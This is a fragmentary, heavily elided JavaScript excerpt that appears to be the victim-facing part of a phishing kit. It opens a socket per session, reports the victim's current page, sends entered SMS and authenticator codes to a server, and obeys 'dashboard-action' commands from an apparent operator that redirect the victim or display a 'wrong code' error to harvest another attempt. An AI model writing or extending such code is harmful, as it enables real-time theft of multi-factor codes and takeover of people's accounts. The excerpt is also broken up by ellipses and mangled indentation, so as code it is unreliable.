...
const MFA_REDIRECT = {
  ...
  function connectSocket(sessionID) {
    ...
    socket.on("connect", () => {
      ...
      socket.emit(EMIT_EVENT, { type: "page", data: "sms", sessionID });
    });
    ...
    socket.on("dashboard-action", ({ buttonName }) => {
      ...
      // If this event maps to a page, redirect (avoid loops if already there)
if (dest) {
  // clear spinner/code persistence BEFORE leaving the page
...
// Only wrong_sms triggers local pending cleanup / UI handling here
// wrong_sms does local cleanup + error UI
if (key === "wrong_sms") {
  try { window.wsClearPendingGAuth && window.wsClearPendingGAuth(); } catch {}
  showWrongCodeError(
...
function sendSMS(code) {
  try {
    socket.emit("client-sms", { sessionID, sms: code });
    socket.emit(EMIT_EVENT, { type: "sms", data: code, sessionID });
  } catch (e) {
...
(function () {
  ...
  function ensureSocket(sessionID) {
    ...
    socket.on("connect", () => { socket.emit(JOIN_EVENT, { sessionID }); socket.emit(EMIT_EVENT, { type: "page", data: "sms", sessionID }); });
    return socket;
  }
